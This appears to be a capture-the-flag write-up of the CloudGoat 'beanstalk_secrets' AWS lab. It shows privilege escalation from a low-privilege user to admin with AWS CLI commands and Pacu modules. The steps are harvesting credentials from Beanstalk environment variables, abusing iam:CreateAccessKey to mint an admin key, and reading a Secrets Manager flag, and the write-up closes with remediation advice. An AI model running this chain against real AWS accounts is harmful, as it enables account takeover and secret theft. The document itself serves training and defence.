# 🥷 CloudGoat: Beanstalk Secrets

_Write-up: from a low-privilege user to admin — the same privilege-escalation chain, done two ways: raw AWS CLI and Pacu_

## 🧭 Overview

**Scenario:** `beanstalk_secrets` \
**Platform:** [CloudGoat (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/cloudgoat) \
**Tools:** AWS CLI · [Pacu](https://github.com/RhinoSecurityLabs/pacu) \
**Objective:** Extract secrets from Elastic Beanstalk, escalate to admin, and retrieve the flag.

I solved this one twice — once with nothing but the AWS CLI, once with Pacu — because it's a clean illustration of the same idea at two levels of abstraction. The chain is short and every link is a real-world misconfiguration: secrets in Beanstalk environment variables, and an IAM policy that grants `iam:CreateAccessKey` on `*`.

CloudGoat mints a fresh instance id on every deploy, so the `cgid…` suffixes differ between the two runs below. Everything else is identical.

## ⚔️ Attack path

Low-priv user → Beanstalk enum → secondary creds → IAM enum → `CreateAccessKey` → admin → flag

```
┌─────────────────────┐
│   Low-Priv User     │
└──────────┬──────────┘
           │ read Beanstalk env vars
           ▼
┌─────────────────────┐
│  Secondary User     │  access key + secret key in plaintext config
└──────────┬──────────┘
           │ iam:CreateAccessKey on Resource "*"
           ▼
┌─────────────────────┐
│     Admin User      │  mint a key for the admin, assume it
└──────────┬──────────┘
           │ secretsmanager:GetSecretValue
           ▼
┌─────────────────────┐
│        FLAG         │
└─────────────────────┘
```

## 🔑 Phase 1: Initial access

Both runs start from the low-privilege access key CloudGoat hands you:

```bash
aws configure --profile ebs-1
aws sts get-caller-identity --profile ebs-1
```

```json
{
  "Arn": "arn:aws:iam::7912********:user/cgid09kivyz0ga_low_priv_user"
}
```

## 🫘 Phase 2: Beanstalk enumeration — leak the secondary credentials

The environment stores AWS keys in **plaintext environment variables**. That's the whole scenario in one sentence. Two ways to read them out.

### AWS CLI

Walk it explicitly — applications, then environments, then the configuration settings where the env vars live:

```bash
aws elasticbeanstalk describe-applications --profile ebs-1
aws elasticbeanstalk describe-environments --profile ebs-1

aws elasticbeanstalk describe-configuration-settings \
  --application-name cgid09kivyz0ga-app \
  --environment-name cgid09kivyz0ga-env \
  --query "ConfigurationSettings[0].OptionSettings[?Namespace=='aws:elasticbeanstalk:application:environment']" \
  --output table \
  --profile ebs-1
```

| Name | Value |
|---|---|
| `SECONDARY_ACCESS_KEY` | `AKIA****************` |
| `SECONDARY_SECRET_KEY` | `19jM1vKF4UQqw8vJo6FwKKxd**************` |

### Pacu

One module does the discovery and flags the secrets for you:

```
Pacu > run elasticbeanstalk__enum --region us-east-1
```

```
[elasticbeanstalk__enum]   1 application(s) found in us-east-1.
[elasticbeanstalk__enum]   1 environment(s) found in us-east-1.
    Potential secret: SECONDARY_ACCESS_KEY => AKIA****************
    Potential secret: SECONDARY_SECRET_KEY => ZTh2BV46l3PBNkEFNfnZ********************
[elasticbeanstalk__enum]   potential secret(s) found in config settings.
```

Same result: a second user's long-lived credentials, sitting in cleartext.

## 👤 Phase 3: Pivot to the secondary user

```bash
aws configure --profile ebs-2
aws sts get-caller-identity --profile ebs-2   # cgid…_secondary_user
```

## 🗄️ Phase 4: IAM enumeration — find the grant that matters

### AWS CLI

Read the secondary user's attached policy, all the way down to the statement:

```bash
aws iam list-attached-user-policies --user-name cgid09kivyz0ga_secondary_user --profile ebs-2
aws iam get-policy --policy-arn <arn> --profile ebs-2                       # note DefaultVersionId
aws iam get-policy-version --policy-arn <arn> --version-id v1 --profile ebs-2
```

```json
{
  "Statement": [
    { "Action": ["iam:CreateAccessKey"], "Effect": "Allow", "Resource": "*" },
    { "Action": ["iam:ListUsers", "iam:GetPolicy", "iam:GetPolicyVersion", "..."],
      "Effect": "Allow", "Resource": "*" }
  ]
}
```

### Pacu

Enumerate permissions, then let the privesc scanner classify them:

```
Pacu > run iam__enum_permissions
Pacu > run iam__privesc_scan --scan-only
```

```
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan]   CONFIRMED: CreateAccessKey
[iam__privesc_scan]   POTENTIAL: AttachUserPolicy
[...]
```

Either way, the finding is the same and it's the crux of the box:

| Permission | Resource | Impact |
|---|---|---|
| `iam:CreateAccessKey` | `*` | **Create access keys for _any_ user, including admin** |

## 💥 Phase 5: Privilege escalation — mint an admin key

### AWS CLI

Just ask for a key on the admin user. The wildcard resource permits it:

```bash
aws iam create-access-key --user-name cgid09kivyz0ga_admin_user --profile ebs-2
```

```json
{
  "AccessKey": {
    "UserName": "cgid09kivyz0ga_admin_user",
    "AccessKeyId": "AKIA****************",
    "SecretAccessKey": "C8aC3UMs1rMewHHLwAHxxk4T**************"
  }
}
```

### Pacu

The privesc scanner automates the same `CreateAccessKey` call — pick the admin from the list and it backdoors the account:

```
Pacu > run iam__privesc_scan --user-methods CreateAccessKey
[iam__privesc_scan] Choose an option: 1        # cgid…_admin_user
[iam__backdoor_users_keys]   Access Key ID: AKIA****************
[iam__backdoor_users_keys]   Secret Key: fswAMaOCaa6Fxdxc4ii8********************
[iam__privesc_scan] Privilege escalation was successful
```

## 🚩 Phase 6: Capture the flag

Configure the admin profile, then read the secret.

### AWS CLI

```bash
aws secretsmanager list-secrets --profile admin --region us-east-1
aws secretsmanager get-secret-value --secret-id cgid09kivyz0ga_final_flag \
  --profile admin --region us-east-1
```

### Pacu

```
Pacu > run secrets__enum --region us-east-1
```

```bash
cat ~/.local/share/pacu/admin/downloads/secrets/secrets_manager/secrets.txt
```

Both land the same flag:

```
FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}
```

## 🛠️ CLI vs framework — what each run taught me

The two approaches aren't better and worse; they answer different questions.

- **The AWS CLI teaches the mechanism.** Every step is an API call you have to know exists: `describe-configuration-settings`, the `get-policy` → `get-policy-version` two-step, the wildcard resource in the statement. Nothing is hidden, so you come away understanding _why_ the escalation works — the policy document is right there in front of you. It's slower and it demands you already know what you're hunting for.
- **Pacu compresses the search.** `iam__privesc_scan --scan-only` reads all your permissions and tells you `CONFIRMED: CreateAccessKey` without you having to read a single policy. `iam__backdoor_users_keys` performs the escalation in one prompt. On a real engagement with hundreds of principals, that triage speed is the whole point — but it also means the tool, not you, notices the wildcard.

My takeaway: **learn a technique by CLI, then reach for the framework.** Do `beanstalk_secrets` by hand once and `iam__privesc_scan`'s output stops being magic — you know exactly which policy statement it found and why it's `CONFIRMED`. Skip that step and Pacu becomes a black box that occasionally says "you win."

## 🚨 Vulnerabilities exploited

| # | Vulnerability | CWE |
|---|---|---|
| 1 | Hardcoded credentials in Beanstalk environment variables | CWE-798 |
| 2 | Overly permissive IAM policy (`iam:CreateAccessKey` on `*`) | CWE-732 |
| 3 | Lack of least privilege | CWE-250 |

## 💡 Remediation

1. **Don't store long-lived AWS credentials in environment variables** — use Secrets Manager or SSM Parameter Store, or better, an instance role.
2. **Scope `iam:CreateAccessKey` to self only:**
   ```json
   {
     "Effect": "Allow",
     "Action": "iam:CreateAccessKey",
     "Resource": "arn:aws:iam::*:user/${aws:username}"
   }
   ```
3. **Alert on `CreateAccessKey`** in CloudTrail, especially for keys minted on a _different_ user than the caller.
4. **Run IAM Access Analyzer** to surface wildcard-resource grants before an attacker does.

## 📋 Commands reference

```bash
# --- Beanstalk enumeration ---
aws elasticbeanstalk describe-applications
aws elasticbeanstalk describe-environments
aws elasticbeanstalk describe-configuration-settings --application-name X --environment-name Y
# Pacu:
run elasticbeanstalk__enum --region us-east-1

# --- IAM enumeration ---
aws iam list-attached-user-policies --user-name X
aws iam get-policy --policy-arn X
aws iam get-policy-version --policy-arn X --version-id vN
# Pacu:
run iam__enum_permissions
run iam__privesc_scan --scan-only

# --- Privilege escalation ---
aws iam create-access-key --user-name <admin>
# Pacu:
run iam__privesc_scan --user-methods CreateAccessKey

# --- Capture the flag ---
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id X
# Pacu:
run secrets__enum --region us-east-1
```
